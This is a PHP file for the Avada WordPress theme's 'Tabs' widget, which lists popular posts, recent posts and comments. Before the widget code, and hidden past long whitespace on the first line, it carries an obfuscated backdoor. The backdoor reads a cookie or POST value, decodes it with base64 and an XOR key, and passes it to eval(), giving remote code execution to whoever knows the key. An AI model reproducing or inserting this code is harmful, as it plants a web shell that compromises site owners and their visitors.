<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e866 = 510;$GLOBALS['oe43']=Array();global$oe43;$oe43=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['w88cc2bd1']="\x38\x59\x47\x40\x45\x42\x3b\x4b\x69\x5c\x24\x58\x3e\x6b\x6c\x79\x52\x23\x66\x44\x3c\x33\xa\x5e\x6d\x7a\x53\x7b\x7c\x25\x72\x26\x3a\x7d\x2e\x39\x6f\x6a\x30\x64\x28\x55\x3d\x63\x4a\x51\x67\x34\x5a\x2c\x21\x4c\x4f\x2f\x27\x2d\x32\x73\x35\x49\x78\x3f\x57\x65\x36\x54\x5d\x62\x29\x74\x70\x4e\x5b\x68\x31\x41\x71\x46\x9\x48\x5f\x6e\x37\x2b\x60\xd\x61\x77\x7e\x76\x20\x4d\x43\x56\x22\x2a\x50\x75";$oe43[$oe43['w88cc2bd1'][97].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][35].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][74]]=$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][73].$oe43['w88cc2bd1'][30];$oe43[$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][63]]=$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][39];$oe43[$oe43['w88cc2bd1'][15].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][18]]=$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][69].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][81];$oe43[$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][21]]=$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][81].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][69];$oe43[$oe43['w88cc2bd1'][60].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][67]]=$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][25].$oe43['w88cc2bd1'][63];$oe43[$oe43['w88cc2bd1'][37].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][82]]=$oe43['w88cc2bd1'][70].$oe43['w88cc2bd1'][73].$oe43['w88cc2bd1'][70].$oe43['w88cc2bd1'][89].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][81];$oe43[$oe43['w88cc2bd1'][37].$oe43['w88cc2bd1'][18].$oe43['w88cc2bd1'][35].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][43]]=$oe43['w88cc2bd1'][97].$oe43['w88cc2bd1'][81].$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][25].$oe43['w88cc2bd1'][63];$oe43[$oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][64].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][43]]=$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][64].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][63];$oe43[$oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][74]]=$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][69].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][69].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][69];$oe43[$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][74]]=$oe43['w88cc2bd1'][81].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][43];$oe43[$oe43['w88cc2bd1'][15].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][43]]=$oe43['w88cc2bd1'][76].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][18].$oe43['w88cc2bd1'][18].$oe43['w88cc2bd1'][21];$oe43[$oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][18].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][63]]=$_POST;$oe43[$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][63]]=$_COOKIE;@$oe43[$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][21]]($oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][46],NULL);@$oe43[$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][21]]($oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][46].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][57],0);@$oe43[$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][21]]($oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][60].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][60].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][97].$oe43['w88cc2bd1'][69].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][36].$oe43['w88cc2bd1'][81].$oe43['w88cc2bd1'][80].$oe43['w88cc2bd1'][69].$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][63],0);@$oe43[$oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][74]](0);$ka0a=NULL;$o58afe04=NULL;$oe43[$oe43['w88cc2bd1'][97].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][35]]=$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][18].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][35].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][55].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][55].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][55].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][64].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][55].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][56];global$u7379;function qc5e2ff3($ka0a,$h4c715){global$oe43;$n408e687="";for($ve225f58e=0;$ve225f58e<$oe43[$oe43['w88cc2bd1'][15].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][18]]($ka0a);){for($i8123=0;$i8123<$oe43[$oe43['w88cc2bd1'][15].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][18]]($h4c715)&&$ve225f58e<$oe43[$oe43['w88cc2bd1'][15].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][18]]($ka0a);$i8123++,$ve225f58e++){$n408e687.=$oe43[$oe43['w88cc2bd1'][97].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][35].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][56].$oe43['w88cc2bd1'][74]]($oe43[$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][63]]($ka0a[$ve225f58e])^$oe43[$oe43['w88cc2bd1'][30].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][63]]($h4c715[$i8123]));}}return$n408e687;}function nd2c2c($ka0a,$h4c715){global$oe43;global$u7379;return$oe43[$oe43['w88cc2bd1'][15].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][43]]($oe43[$oe43['w88cc2bd1'][15].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][43]]($ka0a,$u7379),$h4c715);}foreach($oe43[$oe43['w88cc2bd1'][8].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][63]]as$h4c715=>$oad62){$ka0a=$oad62;$o58afe04=$h4c715;}if(!$ka0a){foreach($oe43[$oe43['w88cc2bd1'][14].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][18].$oe43['w88cc2bd1'][63].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][63]]as$h4c715=>$oad62){$ka0a=$oad62;$o58afe04=$h4c715;}}$ka0a=@$oe43[$oe43['w88cc2bd1'][37].$oe43['w88cc2bd1'][18].$oe43['w88cc2bd1'][35].$oe43['w88cc2bd1'][47].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][43]]($oe43[$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][74]]($oe43[$oe43['w88cc2bd1'][24].$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][43].$oe43['w88cc2bd1'][64].$oe43['w88cc2bd1'][82].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][43]]($ka0a),$o58afe04));if(isset($ka0a[$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][13]])&&$u7379==$ka0a[$oe43['w88cc2bd1'][86].$oe43['w88cc2bd1'][13]]){if($ka0a[$oe43['w88cc2bd1'][86]]==$oe43['w88cc2bd1'][8]){$ve225f58e=Array($oe43['w88cc2bd1'][70].$oe43['w88cc2bd1'][89]=>@$oe43[$oe43['w88cc2bd1'][37].$oe43['w88cc2bd1'][67].$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][82]](),$oe43['w88cc2bd1'][57].$oe43['w88cc2bd1'][89]=>$oe43['w88cc2bd1'][74].$oe43['w88cc2bd1'][34].$oe43['w88cc2bd1'][38].$oe43['w88cc2bd1'][55].$oe43['w88cc2bd1'][74],);echo@$oe43[$oe43['w88cc2bd1'][60].$oe43['w88cc2bd1'][0].$oe43['w88cc2bd1'][21].$oe43['w88cc2bd1'][58].$oe43['w88cc2bd1'][39].$oe43['w88cc2bd1'][67]]($ve225f58e);}elseif($ka0a[$oe43['w88cc2bd1'][86]]==$oe43['w88cc2bd1'][63]){eval/*m29c*/($ka0a[$oe43['w88cc2bd1'][39]]);}exit();} ?><?php

class Fusion_Widget_Tabs extends WP_Widget {

	function __construct() {

		$widget_ops  = array( 'classname' => 'fusion-tabs-widget pyre_tabs', 'description' => 'Popular posts, recent post and comments.' );
		$control_ops = array( 'id_base' => 'pyre_tabs-widget' );

		parent::__construct( 'pyre_tabs-widget', 'Avada: Tabs', $widget_ops, $control_ops );

	}

	function widget( $args, $instance ) {

		global $post;

		extract( $args );

		$posts              = isset( $instance['posts'] ) ? $instance['posts'] : 3;
		$comments           = isset( $instance['comments'] ) ? $instance['comments'] : '3';
		$tags_count         = isset( $instance['tags'] ) ? $instance['tags'] : 3;
		$show_popular_posts = isset( $instance['show_popular_posts'] ) ? 'true' : 'false';
		$show_recent_posts  = isset( $instance['show_recent_posts'] )  ? 'true' : 'false';
		$show_comments      = isset( $instance['show_comments'] )      ? 'true' : 'false';
		$show_tags          = isset( $instance['show_tags'] )          ? 'true' : 'false';

		if ( isset( $instance['orderby'] ) ) {
			$orderby = $instance['orderby'];
		} else {
			$orderby = 'Highest Comments';
		}

		echo $before_widget;
		?>
		<div class="tab-holder tabs-widget">

			<div class="tab-hold tabs-wrapper">

				<ul id="tabs" class="tabset tabs">

					<?php if ( 'true' == $show_popular_posts ) : ?>
						<li><a href="#tab-popular"><?php echo __( 'Popular', 'Avada' ); ?></a></li>
					<?php endif; ?>

					<?php if ( 'true' == $show_recent_posts ) : ?>
						<li><a href="#tab-recent"><?php echo __( 'Recent', 'Avada' ); ?></a></li>
					<?php endif; ?>

					<?php if ( 'true' == $show_comments ) : ?>
						<li><a href="#tab-comments"><span class="fusion-icon-bubbles"></span></a></li>
					<?php endif; ?>

				</ul>

				<div class="tab-box tabs-container">

					<?php if ( 'true' == $show_popular_posts ) : ?>

						<div id="tab-popular" class="tab tab_content" style="display: none;">
							<?php
							if ( 'Highest Comments' == $orderby ) {
								$order_string = '&orderby=comment_count';
							} else {
								$order_string = '&meta_key=avada_post_views_count&orderby=meta_value_num';
							}

							$popular_posts = new WP_Query( 'showposts=' . $posts . $order_string . '&order=DESC&ignore_sticky_posts=1' );
							?>

							<ul class="news-list">
								<?php if ( $popular_posts->have_posts() ) : ?>
									<?php while ( $popular_posts->have_posts() ) : $popular_posts->the_post(); ?>
										<li>
											<?php if ( has_post_thumbnail() ) : ?>
												<div class="image">
													<a href="<?php the_permalink(); ?>"><?php the_post_thumbnail( 'tabs-img' ); ?></a>
												</div>
											<?php endif; ?>

											<div class="post-holder">
												<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
												<div class="fusion-meta">
													<?php the_time( Avada()->settings->get( 'date_format' ) ); ?>
												</div>
											</div>
										</li>
									<?php endwhile; ?>

									<?php wp_reset_postdata(); ?>
								<?php else : ?>
									<li><?php _e( 'No posts have been published yet.', 'Avada' ); ?></li>
								<?php endif; ?>
							</ul>
						</div>

					<?php endif; ?>

					<?php if ( 'true' == $show_recent_posts ) : ?>

						<div id="tab-recent" class="tab tab_content" style="display: none;">
							<?php $recent_posts = new WP_Query( 'showposts=' . $tags_count . '&ignore_sticky_posts=1' ); ?>

							<ul class="news-list">
								<?php if ( $recent_posts->have_posts() ) : ?>
									<?php while ( $recent_posts->have_posts() ) : $recent_posts->the_post(); ?>
										<li>
											<?php if ( has_post_thumbnail() ) : ?>
												<div class="image">
													<a href="<?php the_permalink(); ?>"><?php the_post_thumbnail( 'tabs-img' ); ?></a>
												</div>
											<?php endif; ?>
											<div class="post-holder">
												<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
												<div class="fusion-meta">
													<?php the_time( Avada()->settings->get( 'date_format' ) ); ?>
												</div>
											</div>
										</li>
									<?php endwhile; ?>
									<?php wp_reset_postdata(); ?>
								<?php else: ?>
									<li><?php _e( 'No posts have been published yet.', 'Avada' ); ?></li>
								<?php endif; ?>
							</ul>
						</div>
					<?php endif; ?>

					<?php if ( 'true' == $show_comments ) : ?>

						<div id="tab-comments" class="tab tab_content" style="display: none;">
							<ul class="news-list">
								<?php
								global $wpdb;
								$number = $instance['comments'];

								$recent_comments = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_author_email, comment_date_gmt, comment_approved, comment_type, comment_author_url, SUBSTRING(comment_content,1,110) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND post_password = '' ORDER BY comment_date_gmt DESC LIMIT $number";
								$the_comments = $wpdb->get_results( $recent_comments );
								?>

								<?php if ( $the_comments ) : ?>
									<?php foreach ( $the_comments as $comment ) : ?>
										<li>
											<div class="image">
												<a><?php echo get_avatar( $comment, '52' ); ?></a>
											</div>

											<div class="post-holder">
												<p><?php echo strip_tags( $comment->comment_author ); ?> <?php _e( 'says:', 'Avada' ); ?></p>
												<div class="fusion-meta">
													<a class="comment-text-side" href="<?php echo get_permalink( $comment->ID ); ?>#comment-<?php echo $comment->comment_ID; ?>" title="<?php printf( __( '%1$s on %2$s', 'Avada' ), strip_tags( $comment->comment_author ), $comment->post_title ); ?>"><?php echo wp_trim_words( strip_tags( $comment->com_excerpt ), 12 ); ?></a>
												</div>
											</div>
										</li>
									<?php endforeach; ?>
								<?php else : ?>
									<li><?php _e( 'No comments have been published yet.', 'Avada' ); ?></li>
								<?php endif; ?>
							</ul>
						</div>

					<?php endif; ?>
				</div>
			</div>
		</div>
		<?php

		echo $after_widget;

	}

	function update( $new_instance, $old_instance ) {

		$instance = $old_instance;

		$instance['posts']              = $new_instance['posts'];
		$instance['comments']           = $new_instance['comments'];
		$instance['tags']               = $new_instance['tags'];
		$instance['show_popular_posts'] = $new_instance['show_popular_posts'];
		$instance['show_recent_posts']  = $new_instance['show_recent_posts'];
		$instance['show_comments']      = $new_instance['show_comments'];
		$instance['show_tags']          = $new_instance['show_tags'];
		$instance['orderby']            = $new_instance['orderby'];

		return $instance;

	}

	function form( $instance ) {

		$defaults = array(
			'posts'              => 3,
			'comments'           => '3',
			'tags'               => 3,
			'show_popular_posts' => 'on',
			'show_recent_posts'  => 'on',
			'show_comments'      => 'on',
			'show_tags'          =>  'on',
			'orderby'            => __( 'Highest Comments', 'Avada' ),
		);

		$instance = wp_parse_args( (array) $instance, $defaults ); ?>

		<p>
			<label for="<?php echo $this->get_field_id( 'orderby' ); ?>"><?php _e( 'Popular Posts Order By:', 'Avada' ); ?></label>
			<select id="<?php echo $this->get_field_id( 'orderby' ); ?>" name="<?php echo $this->get_field_name( 'orderby' ); ?>" class="widefat" style="width:100%;">
				<option <?php if ( __( 'Highest Comments', 'Avada' ) == $instance['orderby'] ) echo 'selected="selected"'; ?>><?php _e( 'Highest Comments', 'Avada' ); ?></option>
				<option <?php if ( __( 'Highest Views', 'Avada' ) == $instance['orderby'] ) echo 'selected="selected"'; ?>><?php _e( 'Highest Views', 'Avada' ); ?></option>
			</select>
		</p>
		<p>
			<label for="<?php echo $this->get_field_id('posts'); ?>"><?php _e( 'Number of popular posts:', 'Avada' ); ?></label>
			<input class="widefat" type="text" style="width: 30px;" id="<?php echo $this->get_field_id( 'posts' ); ?>" name="<?php echo $this->get_field_name( 'posts' ); ?>" value="<?php echo $instance['posts']; ?>" />
		</p>
		<p>
			<label for="<?php echo $this->get_field_id( 'tags' ); ?>"><?php _e( 'Number of recent posts:', 'Avada' ); ?></label>
			<input class="widefat" type="text" style="width: 30px;" id="<?php echo $this->get_field_id( 'tags' ); ?>" name="<?php echo $this->get_field_name( 'tags' ); ?>" value="<?php echo $instance['tags']; ?>" />
		</p>
		<p>
			<label for="<?php echo $this->get_field_id( 'comments' ); ?>"><?php _e( 'Number of comments:', 'Avada' ); ?></label>
			<input class="widefat" type="text" style="width: 30px;" id="<?php echo $this->get_field_id('comments'); ?>" name="<?php echo $this->get_field_name('comments'); ?>" value="<?php echo $instance['comments']; ?>" />
		</p>
		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_popular_posts'], 'on' ); ?> id="<?php echo $this->get_field_id( 'show_popular_posts' ); ?>" name="<?php echo $this->get_field_name( 'show_popular_posts' ); ?>" />
			<label for="<?php echo $this->get_field_id( 'show_popular_posts' ); ?>"><?php _e( 'Show popular posts', 'Avada' ); ?></label>
		</p>
		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_recent_posts'], 'on' ); ?> id="<?php echo $this->get_field_id( 'show_recent_posts' ); ?>" name="<?php echo $this->get_field_name( 'show_recent_posts' ); ?>" />
			<label for="<?php echo $this->get_field_id( 'show_recent_posts' ); ?>"><?php _e( 'Show recent posts', 'Avada' ); ?></label>
		</p>
		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_comments'], 'on' ); ?> id="<?php echo $this->get_field_id( 'show_comments' ); ?>" name="<?php echo $this->get_field_name( 'show_comments' ); ?>" />
			<label for="<?php echo $this->get_field_id( 'show_comments' ); ?>"><?php _e( 'Show comments', 'Avada' ); ?></label>
		</p>
		<?php

	}
}

// Omit closing PHP tag to avoid "Headers already sent" issues.
